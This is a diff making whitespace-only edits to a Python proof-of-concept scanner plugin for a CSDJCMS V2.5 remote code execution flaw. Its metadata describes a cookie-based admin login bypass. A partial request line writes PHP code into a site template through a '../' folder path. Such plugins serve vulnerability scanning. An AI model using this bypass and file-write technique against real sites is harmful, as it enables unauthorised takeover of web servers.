@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CSDJCMS_0001' # 平台漏洞编号
+    vuln_id = 'CSDJCMS_0001'  # 平台漏洞编号
     name = 'CSDJCMS(程氏舞曲管理系统) V2.5 getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2013-04-11'  # 漏洞公布时间
     desc = '''
         CSDJCMS(程氏舞曲管理系统) V2.5 admin_loginstate.php文件中，如果s_login 的值等于 四个cookie 相加的md5加密，即可直接通过验证。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'CSDJCMS(程氏舞曲管理系统)'  # 漏洞应用名称
     product_version = 'CSDJCMS(程氏舞曲管理系统) V2.5'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1d8c9a29-1986-4bc9-873d-b1fea9a7b87d'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             url = self.target
             o = urlparse.urlparse(url)
@@ -61,6 +63,7 @@ FileName=cs-bottom.php&content=%3C%3Fphp+phpinfo+%3F%3E&folder=..%2Fskins%2Finde
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
